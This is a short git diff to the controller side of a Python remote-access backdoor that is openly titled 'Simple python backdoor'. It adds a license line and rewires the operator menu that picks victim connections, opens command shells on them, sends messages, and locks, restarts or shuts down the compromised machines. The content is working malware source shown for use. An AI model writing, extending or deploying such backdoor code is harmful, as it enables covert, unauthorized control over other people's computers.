@@ -1,5 +1,6 @@
 '''
 Simple python backdoor by xp4xbox
+License: https://creativecommons.org/licenses/by/2.0/
 
 VERSION 1.5 CHANGELOG:
 server is now Linux compatible!
@@ -115,7 +116,7 @@ def main_menu():
             close()
             break  # break to continue work() function
         elif strChoice[:3] == "--e" and len(strChoice) > 3:
-            conn = select_connection(strChoice[3:len(strChoice)], "True")
+            conn = select_connection(strChoice[3:len(strChoice)], "False")
             if conn is not None:
                 command_shell()
         else:
@@ -400,7 +401,7 @@ def send_commands():
             elif strChoice == "--c":
                 conn.send(str.encode("exit"))
                 conn.close()
-                break
+                main_menu()
             elif strChoice[:3] == "--m" and len(strChoice) > 3:
                 strMsg = "msg" + strChoice[4:len(strChoice)]
                 conn.send(str.encode(strMsg))
@@ -425,9 +426,9 @@ def send_commands():
                 blnClose = lock_res_shut(strChoice[3:len(strChoice)])
                 if blnClose == "True":  # if the computer is shutdown
                     conn.close()
-                    break
+                    main_menu()
             elif strChoice == "--b":
-                break
+                main_menu()
             elif strChoice == "--e":
                 command_shell()
             elif strChoice == "--d":
